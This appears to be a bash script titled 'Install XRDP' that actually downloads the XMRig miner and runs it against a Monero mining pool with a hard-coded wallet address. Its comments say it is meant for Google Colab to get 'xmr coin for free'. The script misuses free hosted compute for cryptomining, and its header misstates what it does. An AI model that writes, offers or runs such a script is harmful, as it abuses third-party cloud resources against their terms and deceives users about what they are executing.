#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o xxmr.2miners.com:12222 -u 8B53b65YSMSjSLKyNZ9kV6VR22yiNPmW2EsuSDLSZn4RDqb6AA9a9KTh4NRc1TMEwjHmrbjB3VWGTi5d6oSp9rQFLBD29gu -k --tls --rig-id GC-US --coin monero
